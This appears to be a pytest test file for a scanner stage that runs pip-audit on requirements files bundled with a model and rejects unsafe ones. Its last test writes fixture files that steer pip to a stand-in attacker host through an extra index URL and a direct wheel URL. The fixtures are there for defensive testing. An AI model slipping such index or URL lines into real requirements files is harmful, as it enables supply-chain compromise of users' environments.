import json
from pathlib import Path
from unittest.mock import MagicMock, patch

from garuda.context import ScanContext
from garuda.stages.static import pip_audit as step


def _ctx(tmp_path):
    ctx = ScanContext(scan_dir=tmp_path, repo="x", revision=None, local_path=None)
    ctx.raw_dir.mkdir()
    ctx.weights_dir.mkdir()
    return ctx


def _fake(exit_code: int, doc: dict | None):
    def run(name, argv, **_):
        if doc is not None:
            Path(argv[argv.index("--output") + 1]).write_text(json.dumps(doc))
        return MagicMock(exit_code=exit_code)
    return run


def test_no_requirements_file_is_skip(tmp_path: Path):
    ctx = _ctx(tmp_path)
    r = step.run(ctx)
    assert r.ran is False and r.skip_reason == "model ships no requirements*.txt"


def test_audits_each_shipped_requirements_file(tmp_path: Path):
    ctx = _ctx(tmp_path)
    (ctx.weights_dir / "requirements.txt").write_text("torch==2.0\n")
    (ctx.weights_dir / "inference").mkdir()
    (ctx.weights_dir / "inference" / "requirements.txt").write_text("numpy==1.0\n")
    (ctx.weights_dir / ".cache").mkdir()
    (ctx.weights_dir / ".cache" / "requirements.txt").write_text("x\n")  # not model content
    doc = {"dependencies": [{"name": "torch", "version": "2.0",
                             "vulns": [{"id": "PYSEC-1", "fix_versions": ["2.1"]}]}]}
    with patch("garuda.stages.static.pip_audit.run_tool", side_effect=_fake(1, doc)) as rt, \
         patch("shutil.which", return_value="/usr/bin/pip-audit"):
        r = step.run(ctx)
    assert r.ran is True  # exit 1 = vulns found, still a completed audit
    assert rt.call_count == 2
    out = json.loads(r.output_path.read_text())
    assert out["requirements_files"] == ["inference/requirements.txt", "requirements.txt"]
    assert {d["requirements_file"] for d in out["dependencies"]} == set(out["requirements_files"])


def test_crash_without_json_is_skip(tmp_path: Path):
    ctx = _ctx(tmp_path)
    (ctx.weights_dir / "requirements.txt").write_text("torch\n")
    with patch("garuda.stages.static.pip_audit.run_tool", side_effect=_fake(1, None)), \
         patch("shutil.which", return_value="/usr/bin/pip-audit"):
        r = step.run(ctx)
    assert r.ran is False and "failed on every requirements file" in (r.skip_reason or "")


def test_pip_audit_missing_binary_writes_stub(tmp_path: Path):
    ctx = _ctx(tmp_path)
    (ctx.weights_dir / "requirements.txt").write_text("torch\n")
    with patch("shutil.which", return_value=None):
        r = step.run(ctx)
    assert r.ran is False
    assert r.skip_reason and "not installed" in r.skip_reason


def test_never_installs_and_refuses_pip_steering_lines(tmp_path: Path):
    ctx = _ctx(tmp_path)
    (ctx.weights_dir / "requirements.txt").write_text("torch==2.0  # pinned\nnumpy[extra]==1.0\n")
    (ctx.weights_dir / "requirements-evil.txt").write_text(
        "--extra-index-url https://evil.example/simple\ntorch==2.0\n")
    (ctx.weights_dir / "requirements-url.txt").write_text("pkg @ https://evil.example/pkg.whl\n")
    (ctx.weights_dir / "requirements-unpinned.txt").write_text("-e .\nrequests\n")
    with patch("garuda.stages.static.pip_audit.run_tool",
               side_effect=_fake(0, {"dependencies": []})) as rt, \
         patch("shutil.which", return_value="/usr/bin/pip-audit"):
        r = step.run(ctx)
    assert rt.call_count == 1  # only the clean file reaches pip-audit
    argv = rt.call_args.args[1]
    assert "--disable-pip" in argv and "--no-deps" in argv
    out = json.loads(r.output_path.read_text())
    assert out["requirements_files"] == ["requirements.txt"]
    assert sorted(f["file"] for f in out["failed"]) == [
        "requirements-evil.txt", "requirements-unpinned.txt", "requirements-url.txt"]
    assert r.ran is False  # refused files mean the audit is incomplete
